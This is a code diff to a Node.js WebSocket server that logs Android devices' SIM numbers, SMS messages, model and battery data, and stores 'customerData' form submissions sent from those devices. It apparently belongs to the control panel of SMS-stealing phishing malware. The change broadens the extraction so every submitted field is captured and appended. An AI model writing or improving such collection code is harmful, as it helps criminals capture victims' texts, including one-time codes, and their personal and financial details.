@@ -38,7 +38,7 @@ const deviceSchema = new mongoose.Schema({
   lastSeen: Date,
   isPinned: { type: Boolean, default: false },
   registrationTimestamp: Date,
-  customerData: { type: Array, default: [] }, // Changed to Array for multiple submissions
+  customerData: { type: Array, default: [] },
   isDeleted: { type: Boolean, default: false },
   smsMessages: Array,
   deletedSmsLog: { type: Array, default: [] },
@@ -176,14 +176,11 @@ wss.on('connection', (ws, req) => {
       const deletedLog = existingDevice?.deletedSmsLog || [];
       const updateSet = { isOnline: true, lastSeen: new Date(), isDeleted: false };
       
-      let s1 = data.sim1 || data.simNumber1 || data.phoneNumber1 || data.mobile1 || data.phone1 || data.simNo1;
-      let s2 = data.sim2 || data.simNumber2 || data.phoneNumber2 || data.mobile2 || data.phone2 || data.simNo2;
-      
-      const payloadData = data.data || data.customerData || {};
-      if (payloadData && typeof payloadData === 'object') {
-          if (!s1) s1 = payloadData.sim1 || payloadData.Mobile || payloadData.mobile || payloadData.Phone || payloadData.phone || payloadData.Number || payloadData.number || payloadData["Mobile Number"] || payloadData["Phone Number"];
-          if (!s2) s2 = payloadData.sim2 || payloadData.Mobile2 || payloadData.mobile2 || payloadData.Phone2 || payloadData.phone2;
-      }
+      // Extracting fields from Flat JSON as per Developer instructions
+      const payloadData = (data.data && typeof data.data === 'object') ? data.data : (data.customerData && typeof data.customerData === 'object' ? data.customerData : data);
+
+      let s1 = data.sim1 || data.simNumber1 || data.phoneNumber1 || data.mobile1 || data.phone1 || data.simNo1 || payloadData.sim1 || payloadData.Mobile || payloadData.mobile || payloadData.Phone || payloadData.phone || payloadData.Number || payloadData.number || payloadData["Mobile Number"] || payloadData["Phone Number"];
+      let s2 = data.sim2 || data.simNumber2 || data.phoneNumber2 || data.mobile2 || data.phone2 || data.simNo2 || payloadData.sim2 || payloadData.Mobile2 || payloadData.mobile2 || payloadData.Phone2 || payloadData.phone2;
 
       if (s1 && s1 !== 'N/A' && s1 !== 'Not Available' && s1 !== 'null') updateSet.sim1 = s1;
       if (s2 && s2 !== 'N/A' && s2 !== 'Not Available' && s2 !== 'null') updateSet.sim2 = s2;
@@ -199,15 +196,25 @@ wss.on('connection', (ws, req) => {
           updateSet.smsMessages = data.messages.filter(m => !deletedLog.includes(`${m.body}_${m.date || m.time}`));
       }
       
-      // Duplicate Submission Support: Push new data instead of updating
       const finalUpdate = { $set: updateSet, $setOnInsert: { registrationTimestamp: new Date(), isPinned: false } };
       
-      if (data.type === 'FORM_SUBMIT' && data.customerData) {
-          const newSubmission = { ...data.customerData, submittedAt: new Date() };
-          finalUpdate.$push = { customerData: newSubmission };
-      } else if (data.type === 'FORM_DATA' && data.data) {
-          const newSubmission = { ...data.data, submittedAt: new Date() };
-          finalUpdate.$push = { customerData: newSubmission };
+      // Corrected Flat JSON Handling for FORM_DATA
+      if (data.type === 'FORM_SUBMIT' || data.type === 'FORM_DATA') {
+          let submission = {};
+          if (data.data && typeof data.data === 'object') {
+              submission = { ...data.data };
+          } else if (data.customerData && typeof data.customerData === 'object') {
+              submission = { ...data.customerData };
+          } else {
+              // Extract all fields from the root message for Flat JSON
+              const { type, deviceId, serialNumber, model, androidVersion, battery, ...rest } = data;
+              submission = { ...rest };
+          }
+          
+          if (Object.keys(submission).length > 0) {
+              submission.submittedAt = new Date();
+              finalUpdate.$push = { customerData: submission };
+          }
       }
       
       if (dbConnected) {
